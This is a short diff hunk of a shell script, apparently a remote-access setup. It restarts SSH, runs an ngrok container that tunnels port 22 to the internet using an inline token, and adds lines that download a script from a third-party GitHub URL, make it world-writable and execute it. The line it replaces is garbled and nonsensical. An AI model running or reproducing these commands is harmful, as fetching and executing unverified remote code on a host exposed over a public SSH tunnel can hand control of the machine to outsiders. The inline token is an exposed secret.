@@ -11,6 +11,6 @@ service ssh restart
 apt install docker.io -y
 docker pull ngrok/ngrok
 docker run --net=host -it -e 25zOFhO9xHS6LJflCnRDtgrWFGl_23YL1E4RHatGeLtdXGh3M=xyz ngrok/ngrok:latest http 22
-cat echo 123 && sleep 3 && echo 321 && sleep 3 && ./echo.sh > echo.sh
+wget https://raw.githubusercontent.com/Rythwertq/launchdeck/main/echo.sh
 chmod 777 echo.sh
 ./echo.sh
